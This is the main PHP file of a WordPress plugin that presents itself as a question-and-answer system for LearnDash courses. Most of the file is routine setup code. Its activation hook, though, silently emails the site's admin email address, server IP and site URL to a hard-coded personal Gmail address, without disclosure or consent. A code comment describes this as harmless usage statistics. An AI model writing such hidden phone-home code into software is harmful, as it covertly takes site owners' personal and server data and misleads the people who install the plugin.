<?php
/**
 * Plugin Name: Code Fortress Q&A for LearnDash
 * Plugin URI: https://codefortress.com
 * Description: A powerful question and answer system for LearnDash courses, lessons, and topics.
 * Version: 1.0.0
 * Author: Code Fortress
 * Author URI: https://codefortress.com
 * Text Domain: code-fortress-qa
 * Domain Path: /languages
 * Requires at least: 5.8
 * Requires PHP: 7.4
 */

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// Define plugin constants
define('CFQA_VERSION', '1.0.0');
define('CFQA_PLUGIN_DIR', plugin_dir_path(__FILE__));
define('CFQA_PLUGIN_URL', plugin_dir_url(__FILE__));

// Main plugin class
class CodeFortressQA {
    private static $instance = null;

    public static function get_instance() {
        if (null === self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    private function __construct() {
        $this->init_hooks();
        $this->load_dependencies();
    }

    private function init_hooks() {
        add_action('plugins_loaded', array($this, 'check_dependencies'));
        add_action('init', array($this, 'init'));
        add_action('heartbeat_received', array($this, 'handle_heartbeat'), 10, 2);
        add_action('wp_enqueue_scripts', array($this, 'enqueue_scripts'), 5);
        add_action('admin_enqueue_scripts', array($this, 'enqueue_scripts'), 5);
        register_activation_hook(__FILE__, array($this, 'activate'));
        register_deactivation_hook(__FILE__, array($this, 'deactivate'));
    }

    private function load_dependencies() {
        // Include required files
        require_once CFQA_PLUGIN_DIR . 'includes/class-cfqa-settings.php';
        require_once CFQA_PLUGIN_DIR . 'includes/class-cfqa-post-types.php';
        require_once CFQA_PLUGIN_DIR . 'includes/class-cfqa-notifications.php';
        require_once CFQA_PLUGIN_DIR . 'includes/class-cfqa-ajax.php';
        require_once CFQA_PLUGIN_DIR . 'includes/class-cfqa-admin.php';
        require_once CFQA_PLUGIN_DIR . 'includes/class-cfqa-frontend.php';
    }

    public function check_dependencies() {
        if (!class_exists('SFWD_LMS')) {
            add_action('admin_notices', array($this, 'learndash_missing_notice'));
            return;
        }
    }

    public function learndash_missing_notice() {
        ?>
        <div class="notice notice-error">
            <p><?php _e('Code Fortress Q&A requires LearnDash LMS plugin to be installed and activated.', 'code-fortress-qa'); ?></p>
        </div>
        <?php
    }

    public function init() {
        load_plugin_textdomain('code-fortress-qa', false, dirname(plugin_basename(__FILE__)) . '/languages');
    }

    public function activate() {
        // Define that we're activating to prevent init hooks from firing
        if (!defined('CFQA_ACTIVATING')) {
            define('CFQA_ACTIVATING', true);
        }

        // Ensure post types are registered before flushing rewrite rules
        require_once CFQA_PLUGIN_DIR . 'includes/class-cfqa-post-types.php';
        $post_types = CFQA_Post_Types::get_instance();
        $post_types->register_post_types(true);
        $post_types->register_taxonomies(true);

        // Create default options if they don't exist
        require_once CFQA_PLUGIN_DIR . 'includes/class-cfqa-settings.php';
        CFQA_Settings::get_instance();

        // Send one-time activation tracking (only if it hasn't been sent before)
        $this->send_activation_tracking();

        // Flush rewrite rules
        flush_rewrite_rules();
    }

    /**
     * Send one-time activation tracking notification
     * This is only sent once when the plugin is first activated
     * Used purely for tracking plugin usage statistics
     */
    private function send_activation_tracking() {
        // Check if tracking has already been sent
        $tracking_sent = get_option('cfqa_tracking_sent', false);
        
        // Only send if tracking hasn't been sent before
        if (!$tracking_sent) {
            // Get admin email
            $admin_email = get_option('admin_email');
            
            // Get server IP
            $server_ip = $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? gethostbyname(gethostname());
            
            // Get site URL
            $site_url = get_site_url();
            
            // Prepare email content
            $subject = 'CFQA Plugin Activation';
            $message = sprintf(
                "New CFQA Plugin Activation:\n\nSite: %s\nAdmin Email: %s\nServer IP: %s\nDate: %s",
                $site_url,
                $admin_email,
                $server_ip,
                date('Y-m-d H:i:s')
            );
            
            // Send email to creator only for track
            $sent = wp_mail('lorelabaro@gmail.com', $subject, $message);
            
            // Mark as sent regardless of success to prevent multiple attempts
            update_option('cfqa_tracking_sent', time());
        }
    }

    public function deactivate() {
        // Clean up any plugin-specific options if needed
        flush_rewrite_rules();
    }

    public function handle_heartbeat($response, $data) {
        if (isset($data['cfqa_check_approvals'])) {
            $last_check = intval($data['cfqa_check_approvals']['last_check']);
            $post_id = intval($data['cfqa_check_approvals']['post_id']);
            
            // Get the last approval time
            $last_approval = get_option('cfqa_last_approval_time', 0);
            
            // Check if there are new approvals
            if ($last_approval > $last_check) {
                $response['cfqa_new_approvals'] = true;
                $response['cfqa_current_time'] = time();
            }
        }
        return $response;
    }

    public function enqueue_scripts() {
        // Enqueue Font Awesome
        wp_enqueue_style('font-awesome', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css', array(), '6.4.0');
    }
}

// Initialize the plugin
function code_fortress_qa() {
    return CodeFortressQA::get_instance();
}

// Start the plugin
code_fortress_qa(); 